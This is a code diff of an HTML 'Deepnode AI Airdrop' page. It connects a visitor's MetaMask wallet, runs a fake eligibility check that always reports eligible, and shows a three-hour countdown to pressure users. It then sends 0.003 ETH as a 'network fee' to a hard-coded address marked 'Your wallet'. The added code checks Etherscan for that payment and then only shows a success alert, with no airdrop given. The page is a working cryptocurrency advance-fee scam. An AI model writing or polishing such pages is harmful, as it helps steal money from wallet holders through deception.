@@ -1,54 +1,28 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Deepnode AI Airdrop</title>
-
 <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
-
 <style>
-html, body {
-  margin:0; padding:0; height:100%;
-  font-family:-apple-system, BlinkMacSystemFont, Inter, Arial;
-  background:linear-gradient(180deg,#05060f,#1a0b2e,#3b145f);
-  color:#fff;
-}
-.container{
-  height:100%; display:flex; flex-direction:column;
-  justify-content:center; align-items:center; text-align:center; padding:24px;
-}
+html, body {margin:0;padding:0;height:100%;font-family:-apple-system,BlinkMacSystemFont,Inter,Arial;color:#fff;background:linear-gradient(180deg,#05060f,#1a0b2e,#3b145f);}
+.container{height:100%;display:flex;flex-direction:column;justify-content:center;align-items:center;text-align:center;padding:24px;}
 .logo{width:110px;margin-bottom:20px}
 h1{font-size:22px;margin-bottom:10px}
-button{
-  width:100%; max-width:340px; padding:16px;
-  font-size:17px; border-radius:14px; border:1px solid rgba(255,255,255,.25);
-  background:rgba(255,255,255,.08); color:#fff; cursor:pointer;
-}
+button{width:100%; max-width:340px; padding:16px; font-size:17px;border-radius:14px;border:1px solid rgba(255,255,255,.25);background:rgba(255,255,255,.08);color:#fff;cursor:pointer;}
 button:disabled{opacity:.5; cursor:not-allowed}
-.status{margin-top:20px; font-size:14px; opacity:.8}
-.footer{position:absolute; bottom:25px; font-size:12px; opacity:.6}
-
-/* Modal */
-.modal{
-  position:fixed; inset:0; background:rgba(0,0,0,0.75);
-  display:none; align-items:center; justify-content:center;
-}
-.box{
-  background:#0e0f1f; padding:24px; border-radius:16px;
-  width:90%; max-width:360px; text-align:center;
-}
-.progress{height:8px; background:rgba(255,255,255,.15); border-radius:10px; overflow:hidden; margin-top:16px}
-.bar{height:100%; width:0%; background:linear-gradient(90deg,#7f5cff,#c77dff)}
-.addr{word-break:break-all; font-size:12px; margin-top:8px; opacity:.8; text-align:center; margin-bottom:10px}
-.payBtn, .claimBtn{
-  margin-top:16px; padding:12px 0; width:100%; border:none; border-radius:12px;
-  background:linear-gradient(90deg,#7f5cff,#c77dff); color:#fff; font-weight:600; cursor:pointer;
-}
+.status{margin-top:20px;font-size:14px;opacity:.8}
+.footer{position:absolute;bottom:25px;font-size:12px;opacity:.6}
+.modal{position:fixed; inset:0;background:rgba(0,0,0,0.75); display:none; align-items:center; justify-content:center;}
+.box{background:#0e0f1f;padding:24px;border-radius:16px;width:90%; max-width:360px;text-align:center;}
+.progress{height:8px;background:rgba(255,255,255,.15);border-radius:10px;overflow:hidden;margin-top:16px}
+.bar{height:100%;width:0%;background:linear-gradient(90deg,#7f5cff,#c77dff)}
+.addr{word-break:break-all;font-size:12px;margin-top:8px;opacity:.8;text-align:center;margin-bottom:10px}
+.payBtn,.claimBtn{margin-top:16px;padding:12px 0;width:100%;border:none;border-radius:12px;background:linear-gradient(90deg,#7f5cff,#c77dff);color:#fff;font-weight:600;cursor:pointer;}
 .claimBtn{display:none;}
 </style>
 </head>
-
 <body>
 
 <div class="container">
@@ -60,7 +34,6 @@ button:disabled{opacity:.5; cursor:not-allowed}
   <div class="footer">Deepnode AI • Terms & Privacy</div>
 </div>
 
-<!-- Eligibility Modal -->
 <div class="modal" id="modal">
   <div class="box">
     <div id="modalText">Checking eligibility…</div>
@@ -72,7 +45,7 @@ button:disabled{opacity:.5; cursor:not-allowed}
 </div>
 
 <script>
-/* ================= TIMER 3 HOURS ================= */
+/* TIMER 3 HOURS */
 const endTime = Date.now() + 3*60*60*1000;
 const timerEl = document.getElementById("timer");
 function updateTimer(){
@@ -86,30 +59,30 @@ function updateTimer(){
 setInterval(updateTimer,1000);
 updateTimer();
 
-/* ================= WALLET ================= */
+/* WALLET */
 let currentAddress = "";
+const recipient = "0xd4Fd6F4e221710b9977109A04E3fBFfA2FD620cd"; // Your wallet
+const etherscanApiKey = "YOUR_ETHERSCAN_API_KEY"; // Get free from Etherscan
+
 async function connectWallet(){
   const statusEl = document.getElementById("status");
   if(!window.ethereum || !window.ethereum.isMetaMask){
-    statusEl.innerText="MetaMask not detected. Please open this page in the MetaMask mobile browser.";
+    statusEl.innerText="MetaMask not detected. Open in MetaMask browser.";
     return;
   }
-
   try{
     const provider = new ethers.providers.Web3Provider(window.ethereum);
     await provider.send("eth_requestAccounts", []);
     const signer = provider.getSigner();
     currentAddress = await signer.getAddress();
-
     statusEl.innerText="Wallet connected: " + currentAddress;
     showEligibility(currentAddress);
-
   }catch{
     statusEl.innerText="Connection rejected.";
   }
 }
 
-/* ================= ELIGIBILITY POPUP ================= */
+/* ELIGIBILITY */
 function showEligibility(address){
   const modal = document.getElementById("modal");
   const bar = document.getElementById("bar");
@@ -138,35 +111,45 @@ function showEligibility(address){
       clearInterval(interval);
       text.innerHTML=`✅ Eligible!<br><br>Ready to claim your airdrop.`;
       addrEl.innerText="Wallet: "+address;
-
-      // Show Pay button only for MetaMask
-      payBtn.style.display="block";
+      payBtn.style.display="block"; // Only MetaMask
     }
   },500);
 }
 
-/* ================= PAY NETWORK FEE ================= */
+/* PAY NETWORK FEE */
 function payFee(){
   if(!currentAddress) return;
-
-  const recipient = "0xd4Fd6F4e221710b9977109A04E3fBFfA2FD620cd";
   const amountWei = "3000000000000000"; // 0.003 ETH
-
-  // Ethereum deep link for MetaMask
-  const url = `ethereum:${recipient}?value=${amountWei}`;
-  window.location.href = url;
-
-  // Unlock claim button after payment step
-  const claimBtn = document.getElementById("claimBtn");
-  claimBtn.style.display="block";
-
-  // Hide pay button
+  window.location.href = `ethereum:${recipient}?value=${amountWei}`;
   document.getElementById("payBtn").style.display="none";
+  document.getElementById("claimBtn").style.display="block"; // unlocked visually
 }
 
-/* ================= CLAIM AIRDROP ================= */
-function claimAirdrop(){
-  alert("Airdrop completed!"); // Only clickable after payment
+/* CLAIM AIRDROP WITH VERIFICATION */
+async function claimAirdrop(){
+  const claimBtn = document.getElementById("claimBtn");
+  claimBtn.disabled = true;
+  document.getElementById("modalText").innerText = "Verifying payment…";
+
+  try{
+    const res = await fetch(`https://api.etherscan.io/api?module=account&action=txlist&address=${currentAddress}&startblock=0&endblock=99999999&sort=desc&apikey=${etherscanApiKey}`);
+    const data = await res.json();
+
+    const paid = data.result.some(tx => 
+      tx.to?.toLowerCase() === recipient.toLowerCase() && 
+      parseFloat(ethers.utils.formatEther(tx.value)) === 0.003
+    );
+
+    if(paid){
+      alert("Airdrop successfully claimed!");
+    } else {
+      alert("Payment of 0.003 ETH not detected. Complete the transaction first.");
+      claimBtn.disabled = false;
+    }
+  }catch(e){
+    alert("Error verifying payment. Try again later.");
+    claimBtn.disabled = false;
+  }
 }
 </script>
 
